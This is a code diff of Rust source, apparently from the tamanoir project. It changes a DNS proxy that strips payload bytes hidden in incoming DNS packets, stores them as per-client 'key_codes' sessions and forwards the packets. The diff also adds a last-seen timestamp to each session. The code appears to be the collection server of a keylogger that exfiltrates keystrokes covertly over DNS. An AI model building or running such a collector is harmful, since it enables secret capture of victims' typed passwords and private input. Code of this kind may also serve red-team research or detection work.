@@ -5,13 +5,12 @@ use std::{
 };
 
 use anyhow::Error;
+use chrono::{DateTime, Utc};
 use log::{debug, error, info};
 use tamanoir_common::ContinuationByte;
 use tokio::{net::UdpSocket, sync::Mutex};
 
-use crate::{
-    Layout, Session, SessionsStore, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT,
-};
+use crate::{Session, SessionsStore, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT};
 
 pub fn max_payload_length(current_dns_packet_size: usize) -> usize {
     512usize
@@ -30,22 +29,15 @@ pub async fn mangle(
     }
     let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
         sessions.lock().await;
-    let mut payload_it = data[data.len() - payload_len..].iter();
+    let payload_it = data[data.len() - payload_len..].iter();
 
-    let layout = Layout::from(*payload_it.next().ok_or(Error::msg("data to short"))?); //first byte is layout
+    //let layout = Layout::from(*payload_it.next().ok_or(Error::msg("data to short"))?); //first byte is layout
     let payload: Vec<u8> = payload_it.copied().collect();
 
     let mut data = data[..(data.len().saturating_sub(payload_len))].to_vec();
     //Add recursion bytes (DNS)
     data[2] = 1;
     data[3] = 32;
-
-    // let key_map = KEYMAPS
-    //     .get()
-    //     .ok_or(Error::msg("error geting LAYOUT KEYMAPS"))?
-    //     .get(&(layout as u8))
-    //     .ok_or(Error::msg("unknow layout"))?;
-
     let session = Session::new(addr).unwrap();
     if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
         info!("Adding new session for client: {} ", session.ip);
@@ -57,24 +49,6 @@ pub async fn mangle(
     for k in payload {
         current_session.key_codes.push(k)
     }
-    // if k != 0 {
-    //     let last_key_code = current_session.key_codes.last();
-    //     if key_map.is_modifier(last_key_code) {
-    //         let _ = current_session.keys.pop();
-    //     }
-    //     let mapped_keys = key_map.get(&k, last_key_code);
-    //     current_session.key_codes.push(k);
-    //     current_session.keys.extend(mapped_keys)
-    // }
-    //}
-    // if !log_enabled!(Level::Debug) {
-    //     print!("\x1B[2J\x1B[1;1H");
-
-    //     std::io::Write::flush(&mut std::io::stdout()).unwrap();
-    // }
-    // for session in current_sessions.values() {
-    //     info!("{}\n", session);
-    // }
 
     Ok(data)
 }
@@ -173,12 +147,16 @@ impl DnsProxy {
             "couldn't parse addr for session {}",
             addr
         )))?;
+
         {
             let mut current_sessions = sessions_store.sessions.lock().await;
             if let Entry::Vacant(e) = current_sessions.entry(s.ip) {
                 info!("Adding new session for client: {} ", s.ip);
                 e.insert(s.clone());
                 sessions_store.try_send(s.clone())?;
+            } else {
+                let current_session = current_sessions.get_mut(&s.ip).unwrap();
+                current_session.latest_packet = Utc::now();
             }
         }
         debug!("{:?} bytes received from {:?}", len, addr);
